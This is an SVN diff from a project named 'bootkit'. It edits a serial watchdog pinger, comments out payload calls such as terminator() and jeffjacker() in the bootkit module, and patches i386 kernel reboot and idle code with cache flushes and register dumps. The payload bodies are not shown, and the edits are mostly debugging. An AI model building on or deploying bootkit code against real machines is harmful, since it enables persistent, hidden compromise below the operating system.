@@ -1,0 +1,250 @@
+Index: bootkit/watchdog.c
+===================================================================
+--- bootkit/watchdog.c	(revision 819)
++++ bootkit/watchdog.c	(working copy)
+@@ -3,11 +3,10 @@
+ #include<sys/types.h>
+ #include<sys/stat.h>
+ #include<fcntl.h>
+-// ./watchdog > /dev/ttyS1
+ 
+ int serial_fd;
+-
+ char watch_ping_bytes[] = {0x02, 0xC0, 0xC8, 0x01, 0x01, 0x01};
++char watch_set_timeout[] = {0x02, 0xC0, 0xC6, 0x01, 0x30, 0x03};
+ 
+ void ping(void);
+ void read_resp(void);
+@@ -17,7 +16,7 @@
+ 	system("stty -F /dev/ttyS1");
+ 
+ 	// Open serial port
+-	serial_fd = open("/dev/ttyS1", O_RDWR);
++	serial_fd = open("/dev/ttyS1", O_RDWR | O_NONBLOCK);
+ 
+ 	if(serial_fd == -1)
+ 	{
+@@ -26,12 +25,14 @@
+ 		return -1;
+ 	}
+ 
++	write(serial_fd, watch_set_timeout, sizeof(watch_set_timeout));
++
+ 	while(1)
+ 	{
+ 		fprintf(stderr, "Pinging watchdog...\n");
+ 		ping();
+ 		sleep(1);
+-//		read_resp();
++		read_resp();
+ 		sleep(20);
+ 	}
+ 
+@@ -40,22 +41,14 @@
+ 
+ void ping()
+ {
+-	int i, size;
+-	
+-	size = sizeof(watch_ping_bytes);
+-	for(i = 0; i < size; i++)
+-	{
+-		//printf("%c", watch_ping_bytes[i]);
+-		write(serial_fd, &(watch_ping_bytes[i]), 1);
+-	}
+-	//fflush(stdout);
++	write(serial_fd, watch_ping_bytes, sizeof(watch_ping_bytes));
+ }
+ 
+ void read_resp()
+ {
+ 	char read_bytes[10];
+ 	read(serial_fd, read_bytes, 3);
+-	printf("Received response %x %x %x\n", read_bytes[0],
++	fprintf(stderr, "Received response %x %x %x\n", read_bytes[0],
+ 		read_bytes[1], read_bytes[2]);
+ }
+ 
+Index: bootkit/module/hw.c
+===================================================================
+--- bootkit/module/hw.c	(revision 819)
++++ bootkit/module/hw.c	(working copy)
+@@ -374,10 +374,10 @@
+ 	fix_pic();
+ 	fix_kbd();
+ 	fix_pit();
+-	fix_net();
+-	fix_disk();
+-	fix_mouse();
+-	fix_time();
+-	fix_msr();
+-	print_remove_media_warning();
++	//fix_net();
++	//fix_disk();
++	//fix_mouse();
++	//fix_time();
++	//fix_msr();
++	//print_remove_media_warning();
+ }
+Index: bootkit/module/payload.c
+===================================================================
+--- bootkit/module/payload.c	(revision 819)
++++ bootkit/module/payload.c	(working copy)
+@@ -296,7 +296,7 @@
+ 	printk("Looking for return point...\n");
+ 	while(((int)hardirq_stack < stack_end) && ((*hardirq_stack++ - reboot) > 30));
+ 
+-	printk("Found return points (ebp, esp)=%08x eip=%08x\n", hardirq_stack, *(hardirq_stack-1));
++	printk("Found return points (ebp, esp)=%08x eip=%08x at offset %08x\n", hardirq_stack, *(hardirq_stack-1), (unsigned)hardirq_stack - kk_hardirq_stack);
+ 
+ 	if(idle_resume)
+ 	{
+@@ -1150,8 +1150,10 @@
+ 
+ void run_payload(void)
+ {
+-	terminator();
+-	jeffjacker();
++	//dump_hex((void*)(kk_hardirq_stack + 0xec0), 400);
++	//while(1);
++	//terminator();
++	//jeffjacker();
+ 	//wwan2_hello();
+ 	//wwan2_lsfd();
+     	//wwan2_disk_hook_setup();
+Index: arch/i386/Kconfig
+===================================================================
+--- arch/i386/Kconfig	(revision 812)
++++ arch/i386/Kconfig	(working copy)
+@@ -815,7 +815,7 @@
+ 
+ config PHYSICAL_START
+ 	hex "Physical address where the kernel is loaded" if (EMBEDDED || CRASH_DUMP)
+-	default "0x00800000"
++	default "0xc00000"
+ 	help
+ 	  This gives the physical address where the kernel is loaded.
+ 
+Index: arch/i386/kernel/process.c
+===================================================================
+--- arch/i386/kernel/process.c	(revision 812)
++++ arch/i386/kernel/process.c	(working copy)
+@@ -181,6 +181,8 @@
+ 	while (1) {
+ 		tick_nohz_stop_sched_tick();
+ 		while (!need_resched()) {
++			/* emchan */
++			wbinvd();
+ 			void (*idle)(void);
+ 
+ 			if (__get_cpu_var(cpu_idle_state))
+Index: arch/i386/kernel/reboot.c
+===================================================================
+--- arch/i386/kernel/reboot.c	(revision 812)
++++ arch/i386/kernel/reboot.c	(working copy)
+@@ -19,6 +19,7 @@
+ #include "mach_reboot.h"
+ #include <asm/reboot_fixups.h>
+ #include <asm/reboot.h>
++#include <asm/cpufeature.h>
+ 
+ /*
+  * Power off function, if any
+@@ -327,8 +328,81 @@
+ {
+ }
+ 
++struct desc_ptr {
++        unsigned short size;
++        unsigned long address;
++} __attribute__((packed)) ;
++
++void flushme()
++{
++	unsigned *addr;
++	const unsigned size = 512 * 1024 * 1024; // HACK
++	printk("Flushing memory from %x-%x\n", PAGE_OFFSET, PAGE_OFFSET + size);
++	if(boot_cpu_data.x86_clflush_size == 64) mb();
++	for(addr = (void*)0; addr < 0xffffffff; addr += 1)
++	{
++		if(boot_cpu_data.x86_clflush_size == 64)
++			asm volatile("clflush (%0)" : : "r"(addr));
++	}
++	if(boot_cpu_data.x86_clflush_size == 64)
++		asm volatile("mfence");
++
++	if(boot_cpu_data.x86_clflush_size == 64) mb();
++	for(addr = (void*)PAGE_OFFSET; addr < (PAGE_OFFSET + size); addr += 1)
++		if(boot_cpu_data.x86_clflush_size == 64)
++			asm volatile("clflush (%0)" : : "r"(addr));
++	if(boot_cpu_data.x86_clflush_size == 64)
++		asm volatile("mfence");
++	if(boot_cpu_data.x86_clflush_size == 64) mb();
++}
++
++void printme()
++{
++	unsigned my_es, my_cs, my_ss, my_ds, my_fs, my_gs;
++	unsigned tr;
++	struct desc_ptr idt, gdt;
++	unsigned int eax, ebx, ecx, edx, edi, esi, ebp, esp;
++	printk("CR0: %x  CR1: %x  CR2: %x  CR3: %x  CR4: %x\n", read_cr0(), 0xdeadbeef, read_cr2(), read_cr3(), read_cr4());
++
++	savesegment(es, my_es);
++	savesegment(cs, my_cs);
++	savesegment(ss, my_ss);
++	savesegment(ds, my_ds);
++	savesegment(fs, my_fs);
++	savesegment(gs, my_gs);
++
++	printk("ES: %x  CS: %x  SS: %x  DS: %x  FS: %x  GS: %x\n", 
++		my_es, my_cs, my_ss, my_ds, my_fs, my_gs);
++
++	// idt, gdt, tr
++	native_store_gdt(&gdt);
++	native_store_idt(&idt);
++	tr = native_store_tr();
++
++	printk("TR: %x  GDT: %x-%x  IDT: %x-%x\n", tr, gdt.address, gdt.size, idt.address, idt.size);
++	
++	asm("mov %%eax, %0" : "=g"(eax));
++	asm("mov %%ebx, %0" : "=g"(ebx));
++	asm("mov %%ecx, %0" : "=g"(ecx));
++	asm("mov %%edx, %0" : "=g"(edx));
++	asm("mov %%edi, %0" : "=g"(edi));
++	asm("mov %%esi, %0" : "=g"(esi));
++	asm("mov %%ebp, %0" : "=g"(ebp));
++	asm("mov %%esp, %0" : "=g"(esp));
++
++	printk("eax: %08x ebx: %08x ecx: %08x edx: %08x edi: %08x esi: %08x \nebp: %08x esp: %08x\n", eax, ebx, ecx, edx, edi, esi, ebp, esp);
++	while(1);
++}
++
+ static void native_machine_emergency_restart(void)
+ {
++	unsigned count = 1000000;
++	native_wbinvd();
++	//flushme();
++	//printme();
++	
++	while(count-- > 0);
++
+ 	if (!reboot_thru_bios) {
+ 		if (efi_enabled) {
+ 			efi.reset_system(EFI_RESET_COLD, EFI_SUCCESS, 0, NULL);
+@@ -338,8 +412,10 @@
+ 		/* rebooting needs to touch the page at absolute addr 0 */
+ 		*((unsigned short *)__va(0x472)) = reboot_mode;
+ 		for (;;) {
++#if 1
+ 			mach_reboot_fixups(); /* for board specific fixups */
+ 			mach_reboot();
++#endif
+ 			/* That didn't work - force a triple fault.. */
+ 			load_idt(&no_idt);
+ 			__asm__ __volatile__("int3");
+@@ -404,3 +480,4 @@
+ }
+ 
+ unsigned char reboot_buf[4096];
++unsigned char page_buf[2*1024*1024];
